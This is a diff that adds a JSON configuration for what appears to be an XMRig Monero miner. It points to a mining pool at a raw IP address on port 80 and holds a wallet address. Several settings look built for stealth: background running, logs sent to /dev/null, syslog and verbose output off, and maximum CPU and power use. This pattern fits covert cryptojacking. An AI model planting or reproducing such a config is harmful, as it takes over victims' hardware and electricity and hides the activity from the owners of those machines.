@@ -1,0 +1,45 @@
+{
+  "api": {
+    "id": null,
+    "worker-id": "worker1"
+  },
+  "autosave": true,
+  "background": true,
+  "colors": true,
+  "randomx": {
+    "1gb-pages": true,
+    "rdmsr": true,
+    "wrmsr": true,
+    "numa": true,
+    "scratchpad_prefetch_mode": 1
+  },
+  "cpu": {
+    "enabled": true,
+    "huge-pages": true,
+    "hw-aes": true,
+    "priority": 5,
+    "asm": true,
+    "max-threads-hint": 100,
+    "pools": [
+      {
+        "url": "146.103.45.69:80",
+        "user": "ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ",
+        "pass": "x",
+        "keepalive": true,
+        "tls": false
+      }
+    ],
+    "rx": [
+      { "low_power_mode": 0, "rx/0": 32 }
+    ],
+    "power-usage": "max"
+  },
+  "donate-level": 1,
+  "log-file": "/dev/null",
+  "pools": null,
+  "print-time": 0,
+  "health-print-time": 0,
+  "syslog": false,
+  "user-agent": null,
+  "verbose": 0
+}
